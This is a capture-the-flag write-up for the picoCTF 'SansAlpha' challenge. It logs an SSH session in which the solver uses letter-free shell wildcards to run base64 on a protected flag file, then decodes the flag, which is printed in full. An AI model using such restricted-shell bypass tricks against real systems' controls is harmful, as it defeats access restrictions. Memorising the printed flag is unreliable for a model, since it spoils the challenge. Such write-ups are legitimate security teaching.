## Descripción
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.
Additional details will be available after launching your challenge instance.
## Solución
```
ssh -p 49701 ctf-player@mimas.picoctf.net
The authenticity of host '[mimas.picoctf.net]:49701 ([52.15.88.75]:49701)' can't be established.
ED25519 key fingerprint is SHA256:n/hDgUtuTTF85Id7k2fxmHvb6rrLrACHNM6xLZ46AqQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mimas.picoctf.net]:49701' (ED25519) to the list of known hosts.
ctf-player@mimas.picoctf.net's password: 
Permission denied, please try again.
ctf-player@mimas.picoctf.net's password: 
Connection closed by 52.15.88.75 port 49701
FRAY30-picoctf@webshell:~$ ssh -p 49701 ctf-player@mimas.picoctf.net
ctf-player@mimas.picoctf.net's password: 
Permission denied, please try again.
ctf-player@mimas.picoctf.net's password: 
Permission denied, please try again.
ctf-player@mimas.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SansAlpha$ */*
bash: blargh/flag.txt: Permission denied

SansAlpha$ /*/??????
/bin/base32: extra operand ‘/bin/base64’
Try '/bin/base32 --help' for more information.

SansAlpha$ /*/????64 */*
/bin/base64: extra operand ‘/bin/x86_64’
Try '/bin/base64 --help' for more information.

SansAlpha$ /*/???[!_]64 */*
/bin/base64: extra operand ‘blargh/flag.txt’
Try '/bin/base64 --help' for more information.

SansAlpha$ /*/???[!_]64 */????.*
cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV80OTQ1NjMwYX0=

SansAlpha$ exit
Connection to mimas.picoctf.net closed.
FRAY30-picoctf@webshell:~$ echo cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV80OTQ1NjMwYX0= | base64 -d
picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}
```
## Notas adicionales

## Referencias